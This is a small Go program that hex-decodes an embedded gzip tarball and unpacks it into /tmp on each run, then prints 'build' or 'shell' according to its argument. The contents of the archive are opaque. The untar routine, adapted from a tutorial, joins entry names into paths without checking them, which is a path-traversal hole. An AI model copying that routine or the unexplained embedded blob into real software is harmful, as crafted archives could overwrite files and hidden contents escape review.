package main;

import (
    "fmt"
    "os"
    "bytes"
    "io"
    "path/filepath"
    "encoding/hex"
    "archive/tar"
    "compress/gzip"
)

func check(e error) {
    if e != nil {
        panic(e)
    }
}

// https://medium.com/@skdomino/taring-untaring-files-in-go-6b07cf56bc07

func main() {
    fmt.Println("Hello, Worldss!")
    fmt.Println(len(os.Args), os.Args[1])

    first := os.Args[1]

    // hex do tar.gz
    b := "1f8b0800202220620003ed564b6fdb4610f65506fc1f36ba4402648a6f4a090c34c8036d812485932287a20896bbb3d2c614972597969d36ffbd334b4a96e2b83d0545017e077b393bcf6f66d6de705d7a2b73f23de123d234a6df4196f887bf0971968627411c06be1fa25e78e2077e966527ccffae59f5681bcb6bc64e3e19fe8f2cfcdbfdff141517577c056c8373f0f4ecf4ec546f2a535b36393b6588b1dad8717f34cdee94df5ad87f68b33b55dcaee74a1740879d104a61a42e57f335dcec64bc166b7d0d73647e27126653d5d034f3d5675da1704ab9a8b6144cac415c4d80415d9b7acafeec0cb462c01e5db052173b11a1e2a516139876922f67a75fc8cf7cced6d656cd93f97c0352b71b0fc3cd7f68aea4d9e8d2501e98e1795bf607aaa139d7e5f9ca9ca7b99f0995a4b9f0b37d4ec4d6649f0b72e4fd8286b62827e31fa128cc8c7d3075219be6d1787a5fa78072621aef59bd6aa633d69f7e0b7e77353b655d37963db938b8db5d512970c3a46198abb7fadc4973521e076a91fb0b5aa800709342dcad08a4f423e97311c6b8568b14826510c5519a713fca9228e7328db1b830cfb3056aa9dc8f524eab182950b14a25083fe449268345841a519a277910057110f831978bd05f80921132e40b19c4224a31780e811090857cb98c96485cac789ec72200fc90102dc32c4a0329971c83a77e9c70e9a7a044922eb84cb248a64266cb3c5f44619c0669b654422d1649aa54142999c83ccad2448a2849a2781982c8e294e7a188412459b20cf3248e542085441b88331fb08e34517e1e053952f02040a590202f32a3af70413ffbe994dcf2190d20d18cf47b2f00871ade599a9649deb7b81fd4ba9e1e340b7b8dbd328cd77fb4fada74f21ab804e7cc6d92f706b6974e34a148bd3b0a77c17ea5999c8ce776538d67bde183f17029bad1b9c069c85b5dc8f1e1721ccd6977bd5b14064503c7f6cd1a27f961fbeefaab4573cbd1a52cd14de308c2b499365e57e1b4db63723b5a7daef7acd2da1ff040358d68c7f1f66ecb47a31a6c5b9724c62f0c3992a09049f4e43d2f4c0313c7c5c83a9fb421772e51a7bb547df8d1da5dec53b0a47d637b17a366abad5893267d612b319dd2b08da981b907027b8a27d396927569919ee00d74adbba0a25fbe7df584c4bbc4b190bdbf5ec4cb5b66ec1aab70cc1c39e94a3ff2e04abfcb080d595707d30d29cfd8a796a8bfd215d3f88e97063f5acc746db6a88d4a6b5e555036d37da4defee2209830a5d5650bf4f1651f8f8221a92bb0ac30825b6d4ab6c5ccc1dd485dbbd79f356bd31692e5c0040eac0549e6bd1df2bcfb0be1fd6cf015c53999f519786ff806a647d194c1d7748b43c4fa7608e79a178d21ffd294c0da86ee95f65ee34e4ef045dd97dcf15343ef90a349090a5931aab722fbebc673b15c13bc5e57e96ed75d5eaf30e39f4a652677c9b9e5eb52a492ed6d050743d3dbbd47a92af8ea7888b4c5d121b6b0f5927a240d34e563cbe04663e73ace50beef0fcd31b97aa1ebae3be8e4e37e6cf16fc43bcbeda42378faf4dece8c768bd429bfbec2d0cf8aa23798313f4b926f9a1d6fdbc84dc2e8701e5c318fa91a47c2c3995fc2aacb5c1da6fd16c790a8dd6742b28fcf2f5f3e7bfff22f77be7cf1e1d28949cdb5b76796ced3e98e8cfba97f95799fb26b9ca970dfae71de69c6a1b4cd7d4a71719fa3da04b3b5f537a979d8ff86972d2f8a5b26e83d626e3bb8b2b4de1c27c311652aa8ddf63c65eefda249dcbac116bca5d5df6b3a273bd7d6b02dc779c1ff5330130c72e788b6fa1ad5f1bfa80270e3bc8eedbb47b16b1ebdd3fff57f9c03060c183060c0800103060c183060c0800103060c183060c0800103060cf85ef81bad588bb700280000"
    data, err := hex.DecodeString(b)
    check(err)

    // lendo o arquivo
    reader := bytes.NewReader(data)
    err = Untar("/tmp", reader)
    check(err)

    if first == "build" {
        fmt.Println("build")
    } else if first == "shell" {
        fmt.Println("shell")
    }
}

func Untar(dst string, r io.Reader) error {
	gzr, err := gzip.NewReader(r)
	if err != nil {
		return err
	}
	defer gzr.Close()

	tr := tar.NewReader(gzr)

	for {
		header, err := tr.Next()

		switch {

		// if no more files are found return
		case err == io.EOF:
			return nil

		// return any other error
		case err != nil:
			return err

		// if the header is nil, just skip it (not sure how this happens)
		case header == nil:
			continue
		}

		// the target location where the dir/file should be created
		target := filepath.Join(dst, header.Name)

		// the following switch could also be done using fi.Mode(), not sure if there
		// a benefit of using one vs. the other.
		// fi := header.FileInfo()

		// check the file type
		switch header.Typeflag {

		// if its a dir and it doesn't exist create it
		case tar.TypeDir:
			if _, err := os.Stat(target); err != nil {
				if err := os.MkdirAll(target, 0755); err != nil {
					return err
				}
			}

		// if it's a file create it
		case tar.TypeReg:
			f, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))
			if err != nil {
				return err
			}

			// copy over contents
			if _, err := io.Copy(f, tr); err != nil {
				return err
			}

			// manually close here after each file operation; defering would cause each file close
			// to wait until all operations have completed.
			f.Close()
		}
	}
}